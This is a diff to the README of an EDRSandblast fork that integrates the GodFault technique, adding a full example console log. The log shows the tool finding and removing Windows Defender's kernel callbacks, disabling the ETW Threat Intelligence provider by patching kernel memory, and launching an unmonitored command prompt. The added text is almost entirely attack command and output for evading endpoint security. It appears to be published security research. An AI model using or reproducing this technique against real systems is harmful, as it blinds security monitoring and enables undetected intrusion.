@@ -3,6 +3,149 @@ By [Gabriel Landau](https://twitter.com/GabrielLandau) at [Elastic Security](htt
 
 Integrates [GodFault](https://github.com/gabriellandau/PPLFault#godfault) into [EDR Sandblast](https://github.com/wavestone-cdt/EDRSandblast), achieving the same result without the use of any vulnerable drivers.
 
+### Example Output
+```
+C:\Users\user\Desktop\Offsets>EDRSandblast.exe --kernelmode cmd
+  ______ _____  _____   _____                 _ _     _           _
+ |  ____|  __ \|  __ \ / ____|               | | |   | |         | |
+ | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_
+ |  __| | |  | |  _  / \___ \ / _` | '_ \ / _` | '_ \| |/ _` / __| __|
+ | |____| |__| | | \ \ ____) | (_| | | | | (_| | |_) | | (_| \__ | |_
+ |______|_____/|_|  \_|_____/ \__,_|_| |_|\__,_|_.__/|_|\__,_|___/\__|
+
+  D3FC0N 30 Edition | Thomas DIOT (@_Qazeer) & Maxime MEIGNAN (@th3m4ks)
+
+[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)
+
+[===== KERNEL MODE =====]
+
+[+] Setting up prerequisites for the kernel read/write primitives...
+[+] Loading kernel related offsets from the CSV file
+[*] System's ntoskrnl.exe file version is: ntoskrnl_22621-1702.exe
+[+] Offsets are available for this version of ntoskrnl.exe (ntoskrnl_22621-1702.exe)!
+[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
+[+] [NotifyRountines]   Enumerating process creation callbacks
+[+] Running command: GodFault.exe -t 2684
+ [?] Server does not appear to be running.  Attempting to install it...
+ [+] CSRSS PID is 748
+ [+] Testing initial ability to acquire PROCESS_ALL_ACCESS to System: Failure
+ [+] Ready.  Spawning WinTcb.
+ [+] SpawnPPL: Waiting for child process to finish.
+ [+] Thread 2684 (KTHREAD FFFF910961E4C080) has been blessed by GodFault
+[+] [NotifyRountines]           fffff8034df25500 [cng.sys + 0x5500]
+[+] [NotifyRountines]           fffff8034e9efdc0 [WdFilter.sys + 0x4fdc0]
+[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRountines]           fffff803487bc460 [ksecdd.sys + 0x1c460]
+[+] [NotifyRountines]           fffff8034eff3fd0 [tcpip.sys + 0x13fd0]
+[+] [NotifyRountines]           fffff8034f5ed980 [iorate.sys + 0xd980]
+[+] [NotifyRountines]           fffff8034dea8890 [CI.dll + 0x88890]
+[+] [NotifyRountines]           fffff803525079f0 [dxgkrnl.sys + 0x179f0]
+[+] [NotifyRountines]           fffff80352be0a70 [vm3dmp.sys + 0x10a70]
+[+] [NotifyRountines]           fffff8036ebccd00 [peauth.sys + 0x3cd00]
+[+] [NotifyRountines]           fffff8036eda1550 [wtd.sys + 0x1550]
+[+] [NotifyRountines]   Found a total of 1 EDR / security products driver(s)
+[+] [NotifyRountines]   Enumerating thread creation callbacks
+[+] [NotifyRountines]           fffff8034e9f15c0 [WdFilter.sys + 0x515c0]
+[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRountines]           fffff8034e9f1350 [WdFilter.sys + 0x51350]
+[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRountines]           fffff8036eb71010 [mmcss.sys + 0x1010]
+[+] [NotifyRountines]   Found a total of 2 EDR / security products driver(s)
+[+] [NotifyRountines]   Enumerating image loading callbacks
+[+] [NotifyRountines]           fffff8034e9f0820 [WdFilter.sys + 0x50820]
+[+] [NotifyRountines]           Found callback belonging to EDR driver WdFilter.sys
+[+] [NotifyRountines]           fffff80352ab5710 [ahcache.sys + 0x25710]
+[+] [NotifyRountines]   Found a total of 1 EDR / security products driver(s)
+
+[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
+[+] [ObjectCallblacks]  Enumerating Process object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFF800C5E2F2940 for handle creations & duplications:
+[+] [ObjectCallblacks]                  Status: Enabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff8034e9eda30 [WdFilter.sys + 0x4da30]
+[+] [ObjectCallblacks]                  Callback belongs to an EDR and is enabled!
+[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
+[+] [ObjectCallblacks]  Object callbacks are present !
+
+[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
+[+] [ETWTI]     ETW Threat Intelligence Provider is ENABLED!
+
+[+] Process is NOT "safe" to launch our payload, removing monitoring and starting another process...
+
+[+] [ETWTI]     Disabling the ETW Threat Intel provider by patching ProviderEnableInfo at 0xffff91095ce8c430 with 0x00.
+[+] [ETWTI]     The ETW Threat Intel provider was successfully disabled!
+
+[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading...
+[+] [NotifyRountines]   Removing process creation callbacks
+[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8034970c2a8 | callback struct: 0xffff91095dbf3a5f | callback function: 0xfffff8034e9efdc0]
+[+] [NotifyRountines]   Removing thread creation callbacks
+[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8034970c4a0 | callback struct: 0xffff91095dbf3b1f | callback function: 0xfffff8034e9f15c0]
+[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8034970c4a8 | callback struct: 0xffff91095dbf3b4f | callback function: 0xfffff8034e9f1350]
+[+] [NotifyRountines]   Removing image loading callbacks
+[+] [NotifyRountines]   Removing callback of EDR driver "WdFilter.sys" [callback addr: 0xfffff8034970c6a0 | callback struct: 0xffff91095dbf3e4f | callback function: 0xfffff8034e9f0820]
+
+[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication...
+[+] [ObjectCallblacks]  Disabling WdFilter.sys callback...
+
+[+] All EDR drivers were successfully removed from Kernel callbacks!
+
+==================================================
+Starting a new unmonitored process...
+==================================================
+
+[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)
+
+[===== KERNEL MODE =====]
+
+[+] Setting up prerequisites for the kernel read/write primitives...
+[+] Loading kernel related offsets from the CSV file
+[*] System's ntoskrnl.exe file version is: ntoskrnl_22621-1702.exe
+[+] Offsets are available for this version of ntoskrnl.exe (ntoskrnl_22621-1702.exe)!
+[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations...
+[+] [NotifyRountines]   Enumerating process creation callbacks
+[+] Running command: GodFault.exe -t 8344
+ [+] Thread 8344 (KTHREAD FFFF91096169F080) has been blessed by GodFault
+ [+] Initial blessing successful
+[+] [NotifyRountines]           fffff8034df25500 [cng.sys + 0x5500]
+[+] [NotifyRountines]           fffff803487bc460 [ksecdd.sys + 0x1c460]
+[+] [NotifyRountines]           fffff8034eff3fd0 [tcpip.sys + 0x13fd0]
+[+] [NotifyRountines]           fffff8034f5ed980 [iorate.sys + 0xd980]
+[+] [NotifyRountines]           fffff8034dea8890 [CI.dll + 0x88890]
+[+] [NotifyRountines]           fffff803525079f0 [dxgkrnl.sys + 0x179f0]
+[+] [NotifyRountines]           fffff80352be0a70 [vm3dmp.sys + 0x10a70]
+[+] [NotifyRountines]           fffff8036ebccd00 [peauth.sys + 0x3cd00]
+[+] [NotifyRountines]           fffff8036eda1550 [wtd.sys + 0x1550]
+[+] [NotifyRountines]   No EDR driver(s) found!
+[+] [NotifyRountines]   Enumerating thread creation callbacks
+[+] [NotifyRountines]           fffff8036eb71010 [mmcss.sys + 0x1010]
+[+] [NotifyRountines]   No EDR driver(s) found!
+[+] [NotifyRountines]   Enumerating image loading callbacks
+[+] [NotifyRountines]           fffff80352ab5710 [ahcache.sys + 0x25710]
+[+] [NotifyRountines]   No EDR driver(s) found!
+
+[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication...
+[+] [ObjectCallblacks]  Enumerating Process object callbacks :
+[+] [ObjectCallblacks]          Callback at FFFF800C5E2F2940 for handle creations & duplications:
+[+] [ObjectCallblacks]                  Status: Disabled
+[+] [ObjectCallblacks]                  Preoperation at 0xfffff8034e9eda30 [WdFilter.sys + 0x4da30]
+[+] [ObjectCallblacks]                  Callback belongs to an EDR but is disabled.
+[+] [ObjectCallblacks]  Enumerating Thread object callbacks :
+[+] [ObjectCallblacks]  Object callbacks are not found !
+
+[+] [ETWTI]     Checking the ETW Threat Intelligence Provider state...
+[+] [ETWTI]     ETW Threat Intelligence Provider is DISABLED!
+
+[+] Process is "safe" to launch our payload
+
+[+] Kernel callbacks have normally been removed, starting cmd.exe
+WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)
+WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!
+
+Microsoft Windows [Version 10.0.22621.1702]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\user\Desktop\Offsets>
+```
+
 👇 Original README below 👇 
 
 # EDRSandBlast
